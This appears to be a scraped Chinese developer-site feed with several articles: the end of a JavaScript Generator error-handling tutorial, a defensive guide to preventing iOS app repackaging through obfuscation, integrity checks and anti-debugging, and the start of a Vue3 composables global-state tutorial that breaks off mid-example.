<p><strong>错误处理</strong>：可通过迭代器的 <code>throw()</code> 方法抛出错误，在 Generator 函数内部用 <code>try/catch</code> 捕获：</p>
<ol>
<li>
<p><code>function* errorHandlerGenerator() { try { yield 1; yield 2; } catch (err) { console.log("捕获错误：", err); } } const generator = errorHandlerGenerator(); generator.next(); // { value: 1, done: false } generator.throw(new Error("自定义错误")); // 捕获错误，后续执行终止 generator.next(); // { value: undefined, done: true }</code></p>
</li>
</ol>
</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[防止 iOS 应用被二次打包，从完整性校验到 IPA 成品混淆的多层安全方案]]></title>    <link>https://juejin.cn/post/7575884229525405732</link>    <guid>https://juejin.cn/post/7575884229525405732</guid>    <pubDate>2025-11-24T06:24:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575884229525405732" data-draft-id="7575884229525389348" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="防止 iOS 应用被二次打包，从完整性校验到 IPA 成品混淆的多层安全方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T06:24:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOS开发上架哦"/> <meta itemprop="url" content="https://juejin.cn/user/3336394949004844"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            防止 iOS 应用被二次打包，从完整性校验到 IPA 成品混淆的多层安全方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3336394949004844/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOS开发上架哦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:24:22.000Z" title="Mon Nov 24 2025 06:24:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在移动安全领域，“二次打包”是 iOS 应用遭遇的最现实威胁之一。尽管 iOS 的安全体系比 Android 严格得多，但只要攻击者获取到 IPA，仍然可以：</p>
<ul>
<li>重新签名（企业证书 / 越狱环境）</li>
<li>篡改资源文件（JS、H5、json、图片、配置）</li>
<li>注入恶意代码（动态库添加）</li>
<li>调整网络请求、Hook 核心逻辑</li>
<li>将修改后的 App 伪装成原版进行分发</li>
</ul>
<p>因此，“防止 iOS 应用被二次打包”并不等于某个单点措施，而是需要一套覆盖 <strong>符号层、资源层、运行时层、签名层、完整性校验层、混淆层</strong> 的组合安全体系。</p>
<p>本文给出一套可在实际项目中落地的工程方案，适合原生、Flutter、H5、Hybrid 各类架构。</p>
<hr/>
<h2 data-id="heading-0">一、二次打包通常是怎么发生的？</h2>
<p>攻击者的常见操作步骤：</p>
<ol>
<li>解包原始 IPA</li>
<li>修改资源（图标、H5、JS 或敏感业务流程）</li>
<li>替换网络接口或注入业务逻辑</li>
<li>添加自定义动态库</li>
<li>重签名（不用 App Store 也能装进越狱机或企业分发）</li>
<li>伪装名称重新分发</li>
<li>用户误以为是官方版本进行下载</li>
</ol>
<p>你会发现：</p>
<ul>
<li>就算原生代码强，加密算法强</li>
<li>只要资源明文暴露，就能被篡改</li>
<li>只要 IPA 可以重签，就能被伪造</li>
<li>只要符号可读，就能轻易定位关键逻辑</li>
</ul>
<p>因此需要多层防护。</p>
<hr/>
<h2 data-id="heading-1">二、防止二次打包 = 多层组合，而非“一个加固工具”</h2>
<p>下面介绍的工具矩阵是完整解决方案的基础。</p>













































<table><thead><tr><th>防护层</th><th>使用工具</th><th>目的</th></tr></thead><tbody><tr><td>静态分析</td><td>MobSF / class-dump</td><td>找出可被轻易篡改的位置</td></tr><tr><td>成品混淆</td><td><strong>Ipa Guard CLI</strong></td><td>混淆符号、扰乱资源、修改 MD5</td></tr><tr><td>资源保护</td><td>Ipa Guard、脚本工具</td><td>防止图片/H5/JS 被替换</td></tr><tr><td>完整性校验</td><td>自研校验模块</td><td>检测注入、资源修改</td></tr><tr><td>重签验证</td><td>kxsign</td><td>检查二次打包是否改变结构</td></tr><tr><td>运行时对抗</td><td>Frida 检测、反调试策略</td><td>防止 Hook 和注入</td></tr><tr><td>上线后治理</td><td>KMS、Bugly/Sentry</td><td>绑定签名与构建号，保证可回滚</td></tr></tbody></table>
<p>以下是可直接应用的工程实践方案。</p>
<hr/>
<h2 data-id="heading-2">三、工程化流程：如何真正减少二次打包风险？</h2>
<h2 data-id="heading-3"><strong>① 使用 MobSF 与 class-dump 检查暴露面</strong></h2>
<p>检查：</p>
<ul>
<li>JS/H5 路径是否明文</li>
<li>JSON / 配置文件是否可替换</li>
<li>Swift/ObjC 方法是否过度暴露</li>
<li>插件桥接方法是否可被 Hook</li>
</ul>
<p>示例：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">class</span>-dump app.ipa &gt; symbols.txt
</code></pre>
<p>输出的数据将指导后续混淆白名单策略。</p>
<hr/>
<h2 data-id="heading-4"><strong>② 使用 Ipa Guard 导出可混淆符号</strong></h2>
<p>即使没有源码，也可以通过成品 IPA 分析和保护。</p>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli parse app.ipa -o sym.json
</code></pre>
<p>会得到一份包含：</p>
<ul>
<li>Swift/ObjC 类和方法列表</li>
<li>文件引用信息</li>
<li>字符串引用</li>
<li>是否可混淆字段</li>
</ul>
<p>这一步是混淆策略的基础。</p>
<hr/>
<h2 data-id="heading-5"><strong>③ 编辑混淆策略（最关键一步）</strong></h2>
<p>混淆策略要考虑：</p>
<h3 data-id="heading-6"><strong>哪些必须保留？</strong></h3>
<ul>
<li>Storyboard id</li>
<li>JS/H5 的桥接方法</li>
<li>SDK 初始化方法</li>
<li>依赖反射的 selector</li>
<li>Flutter 字符串通道名</li>
<li>React Native 桥接方法</li>
</ul>
<h3 data-id="heading-7"><strong>哪些可以混淆？</strong></h3>
<ul>
<li>内部业务逻辑</li>
<li>Swift 和 ObjC 的非外部方法</li>
<li>自定义组件</li>
<li>数据处理模块</li>
<li>容易被逆向定位的关键方法</li>
</ul>
<p>修改规则：</p>
<ul>
<li><code>confuse:false</code> 保留</li>
<li><code>confuse:true</code> 混淆</li>
<li><code>refactorName</code> 必须长度保持一致</li>
</ul>
<hr/>
<h2 data-id="heading-8"><strong>④ 执行 IPA 混淆与资源扰动（防篡改、防替换）</strong></h2>
<p>核心命令：</p>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli protect app.ipa -c sym.json --email dev@team.com --image --js -o protected.ipa
</code></pre>
<p>保护能力：</p>
<p>Swift/ObjC 方法名替换
类名重写
资源名称混淆
图片 MD5 扰动（使替换失效）
H5/JS 重命名（Hybrid 必须）
修改结构，干扰二次打包流程</p>
<p>混淆后的资源没有统一名称，攻击者难以判断哪些资源对应哪些逻辑。</p>
<hr/>
<h2 data-id="heading-9"><strong>⑤ 重签名并测试</strong></h2>
<p>测试混淆是否破坏功能。</p>
<pre><code class="hljs language-bash" lang="bash">kxsign sign protected.ipa -c dev.p12 -p <span class="hljs-built_in">pwd</span> \
  -m dev.mobileprovision -z signed.ipa -i
</code></pre>
<p>验证：</p>
<ul>
<li>启动与运行</li>
<li>登录逻辑</li>
<li>JS/H5 加载</li>
<li>Flutter/插件是否正常工作</li>
<li>推送、支付是否正常</li>
<li>配置文件读取是否正常</li>
</ul>
<hr/>
<h2 data-id="heading-10"><strong>⑥ 运行时对抗（进一步提高二次打包成本）</strong></h2>
<p>包含：</p>
<h3 data-id="heading-11"><strong>1. Frida 动态检测</strong></h3>
<pre><code class="hljs language-css" lang="css">frida -U -f com<span class="hljs-selector-class">.app</span> <span class="hljs-attr">--no-pause</span> -l detect<span class="hljs-selector-class">.js</span>
</code></pre>
<p>检查：</p>
<ul>
<li>是否能轻易 Hook</li>
<li>是否能注入自定义模块</li>
<li>私有 API 是否可被调用</li>
</ul>
<h3 data-id="heading-12"><strong>2. 基础反调试策略</strong></h3>
<p>（实现方式略，工程团队自有方案）</p>
<ul>
<li>ptrace</li>
<li>sysctl 检测调试器</li>
<li>检测越狱环境</li>
<li>检测动态库注入</li>
</ul>
<p>这些策略极大提升二次修改的难度。</p>
<hr/>
<h2 data-id="heading-13"><strong>⑦ 完整性校验体系（可选但强烈建议）</strong></h2>
<p>常见做法包括：</p>
<ul>
<li>校验资源文件 MD5</li>
<li>校验核心业务模块哈希</li>
<li>检测 main bundle 结构是否被修改</li>
<li>检测签名与构建号是否匹配</li>
</ul>
<p>配合 Ipa Guard 的 MD5 扰动效果更佳。</p>
<hr/>
<h2 data-id="heading-14"><strong>⑧ 混淆映射治理（保证正常运行与回滚能力）</strong></h2>
<p>存储内容：</p>
<ul>
<li>混淆映射表</li>
<li>sym.json</li>
<li>构建号</li>
<li>IPA 的签名指纹</li>
</ul>
<p>存放方式：</p>
<ul>
<li>KMS/HSM</li>
<li>加密 Git 仓库</li>
<li>部署流水线绑定</li>
</ul>
<p>用于：</p>
<ul>
<li>崩溃符号化</li>
<li>安全部署审计</li>
<li>一键回滚</li>
</ul>
<hr/>
<h2 data-id="heading-15">防止二次打包靠“组合拳”，而不是某个工具</h2>
<p>最终推荐方案：</p>
<h3 data-id="heading-16"><strong>分析层</strong></h3>
<p>MobSF
class-dump</p>
<h3 data-id="heading-17"><strong>加固层（核心）</strong></h3>
<p>Ipa Guard CLI</p>
<ul>
<li>IPA 符号混淆</li>
<li>资源名称扰动</li>
<li>H5/JS 路径保护</li>
<li>图片 MD5 干扰</li>
<li>无需源码即可使用</li>
</ul>
<h3 data-id="heading-18"><strong>验证层</strong></h3>
<p>kxsign（重签安装）
Frida（Hook/注入测试）
Hopper/IDA（查看混淆效果）</p>
<h3 data-id="heading-19"><strong>策略与治理层</strong></h3>
<p>完整性校验
KMS 映射治理
Bugly/Sentry 符号化</p>
<p><strong>只有当这些层协同工作时，二次打包的成本才会变得“不值得”。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 组合式函数：能否作为模块级全局状态管理？]]></title>    <link>https://juejin.cn/post/7575718948299112499</link>    <guid>https://juejin.cn/post/7575718948299112499</guid>    <pubDate>2025-11-24T06:43:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575718948299112499" data-draft-id="7575757258834083866" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 组合式函数：能否作为模块级全局状态管理？"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T06:43:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三小河"/> <meta itemprop="url" content="https://juejin.cn/user/4222562141210478"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 组合式函数：能否作为模块级全局状态管理？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4222562141210478/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三小河
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:43:50.000Z" title="Mon Nov 24 2025 06:43:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Vue3 生态中，组合式 API（Composition API）的出现彻底改变了逻辑复用的方式，其中<strong>组合式函数（Composables）</strong>  作为核心载体，不仅能复用组件逻辑，也常被开发者尝试用于全局状态管理。这自然引出一系列疑问：Vue3 的组合式函数能否实现模块级全局状态？其原理与 React 自定义 Hook 有何异同？每次组件引入后内部的响应式状态会重新初始化吗？本文将从 Vue3 的设计理念出发，结合原理、示例与细节，全面解答这些问题。</p>
<h2 data-id="heading-0">一、先明确结论</h2>
<ol>
<li><strong>Vue3 组合式函数可以实现模块级全局状态管理</strong>，且相比 React 自定义 Hook 更 “天然”—— 因为 Vue3 的响应式系统（Proxy）不依赖组件实例，模块级的响应式状态可直接被跨组件共享；</li>
<li>核心原理是<strong>模块作用域 + 响应式状态的闭包缓存</strong>：模块初始化时创建的响应式对象（<code>ref</code>/<code>reactive</code>）会被存储在模块闭包中，所有组件导入并调用组合式函数时，共享同一个响应式实例；</li>
<li>每次组件引入并调用组合式函数时，<strong>内部的响应式状态不会重新初始化</strong>—— 仅函数逻辑会重复执行，但始终返回模块缓存的同一个响应式对象，确保状态全局一致。</li>
</ol>
<h2 data-id="heading-1">二、为什么 Vue3 组合式函数更适合做全局状态？核心原理拆解</h2>
<p>要理解这一点，需先理清 Vue3 的两个关键特性：<strong>模块作用域</strong>和<strong>响应式系统的独立性</strong>，并对比 React 自定义 Hook 的差异。</p>
<h3 data-id="heading-2">1. 模块作用域：状态的 “全局容器”（与 React 一致）</h3>
<p>和 ES6 模块机制相同，Vue3 中每个 <code>.js</code>/<code>.vue</code> 文件都是独立模块，模块内的变量、函数会形成<strong>模块级作用域</strong>：</p>
<ul>
<li>模块被首次导入时，会执行一次初始化逻辑，创建内部变量的实例；</li>
<li>后续所有组件导入该模块时，共享的是同一个模块实例，模块内的变量不会重复创建 —— 这是全局状态能 “共享” 的基础。</li>
</ul>
<h3 data-id="heading-3">2. Vue3 响应式系统：不依赖组件实例（核心差异点）</h3>
<p>这是 Vue3 组合式函数相比 React 自定义 Hook 更适合做全局状态的关键：</p>
<ul>
<li>React 的 <code>useState</code>/<code>useEffect</code> 等 Hook 是<strong>与组件实例强绑定</strong>的，状态存储在组件的 Hook 链表中，若要实现全局共享，必须通过模块闭包 “脱离” 组件实例；</li>
<li>而 Vue3 的 <code>ref</code>/<code>reactive</code> 是<strong>独立于组件实例</strong>的 —— 只要创建了响应式对象，无论在模块内、组件内，其响应式能力都由 Proxy 代理机制保证，无需依赖组件上下文。</li>
</ul>
<p>简单说：Vue3 模块内创建的响应式状态，本身就是 “全局可用” 的，组合式函数只是封装了状态和操作方法，让组件能便捷地访问和修改。</p>
<h3 data-id="heading-4">3. 组合式函数的 “全局化” 本质：闭包缓存响应式实例</h3>
<p>组合式函数实现全局状态的核心逻辑的是：</p>
<ol>
<li>在模块内创建响应式状态（<code>ref</code>/<code>reactive</code>）；</li>
<li>封装修改该状态的方法（如 <code>setUser</code>/<code>logout</code>）；</li>
<li>组合式函数执行时，直接返回模块缓存的响应式状态和方法；</li>
<li>所有组件调用该组合式函数时，拿到的是同一个响应式实例 —— 因此状态变更会同步到所有使用该状态的组件。</li>
</ol>
<p>对比 React 自定义 Hook：Vue3 无需手动维护订阅者（如 <code>subscribers</code> 集合），因为响应式对象本身会触发依赖追踪，组件使用状态时自动成为依赖，状态更新时会自动触发组件重新渲染。</p>
<h2 data-id="heading-5">三、实战示例：用组合式函数实现模块级全局状态</h2>
<p>下面通过 3 个递进示例，从基础实现到通用方案，展示 Vue3 组合式函数的全局状态能力，并验证 “状态不重复初始化” 的特性。</p>
<h3 data-id="heading-6">示例 1：基础版全局状态（共享用户信息）</h3>
<p>需求：实现全局用户状态，支持登录、登出，在多个组件中共享用户信息，状态更新时自动同步渲染。</p>
<h4 data-id="heading-7">步骤 1：定义全局组合式函数（模块级）</h4>
<p>创建 <code>useGlobalUser.js</code> 文件，作为全局状态模块：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useGlobalUser.js（模块级全局状态组合式函数）</span>
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-comment">// 模块作用域的响应式状态：闭包缓存，仅初始化一次</span>
<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 全局用户状态（ref 确保基本类型响应式）</span>

<span class="hljs-comment">// 计算属性：派生状态（是否登录）</span>
<span class="hljs-keyword">const</span> isLogin = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!user.<span class="hljs-property">value</span>);

<span class="hljs-comment">// 操作方法：修改全局状态</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">login</span> = (<span class="hljs-params">userInfo</span>) =&gt; {
  <span class="hljs-comment">// 替换响应式对象的值（ref 通过 .value 访问/修改）</span>
  user.<span class="hljs-property">value</span> = { ...userInfo };
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">logout</span> = (<span class="hljs-params"/>) =&gt; {
  user.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>;
};

<span class="hljs-comment">// 组合式函数：供组件调用</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useGlobalUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 直接返回模块缓存的响应式状态和方法（所有组件共享同一实例）</span>
  <span class="hljs-keyword">return</span> {
    user,
    isLogin,
    login,
    logout
  };
}
</code></pre>
<h4 data-id="heading-8">步骤 2：在多个组件中使用该组合式函数</h4>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Header.vue 组件 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Vue3 全局状态示例<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-info"</span>&gt;</span>
